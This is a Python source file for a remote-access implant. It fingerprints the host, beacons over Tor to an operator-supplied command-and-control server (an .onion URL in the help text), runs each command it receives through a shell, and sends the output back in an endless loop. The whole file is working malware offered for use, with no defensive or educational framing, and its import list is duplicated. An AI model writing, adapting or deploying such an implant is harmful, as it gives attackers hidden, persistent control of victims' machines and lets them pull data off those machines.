import requests
import time
import json
import subprocess
import platform
import uuid
import socket
import socks
import sys
import os
import time
import json
import subprocess
import platform
import uuid
import socket
import socks
import sys


C2_URL = "http://localhost:5000" 
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 9050 

def get_system_info():
    return {
        'id': str(uuid.getnode()),
        'hostname': socket.gethostname(),
        'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        'os': platform.system(),
        'release': platform.release()
    }

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return str(e.output)
    except Exception as e:
        return str(e)

def beacon(url, proxies):
    info = get_system_info()
    try:
        print(f"[*] Beaconing to {url}...")
        response = requests.post(f"{url}/api/beacon", json=info, proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            commands = data.get('commands', [])
            for cmd in commands:
                print(f"[*] Received command: {cmd['command']}")
                output = execute_command(cmd['command'])
                send_result(url, cmd['id'], output, proxies)
        else:
            print(f"[!] Beacon failed: {response.status_code}")
    except Exception as e:
        print(f"[!] Beacon error: {e}")

def send_result(url, cmd_id, output, proxies):
    data = {
        'id': str(uuid.getnode()),
        'cmd_id': cmd_id,
        'output': output
    }
    try:
        requests.post(f"{url}/api/result", json=data, proxies=proxies)
        print(f"[*] Sent result for command {cmd_id}")
    except Exception as e:
        print(f"[!] Error sending result: {e}")

if __name__ == "__main__":
    import argparse
    import os
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help='C2 URL (e.g., http://xyz.onion)', required=True)
    parser.add_argument('--tor-port', help='Tor SOCKS port', default=9050, type=int)
    args = parser.parse_args()
    
   
    proxies = {
        'http': f'socks5h://127.0.0.1:{args.tor_port}',
        'https': f'socks5h://127.0.0.1:{args.tor_port}'
    }
    
    print(f"[*] Implant started. ID: {uuid.getnode()}")
    print(f"[*] C2 URL: {args.url}")
    
    while True:
        beacon(args.url, proxies)
        time.sleep(10) 
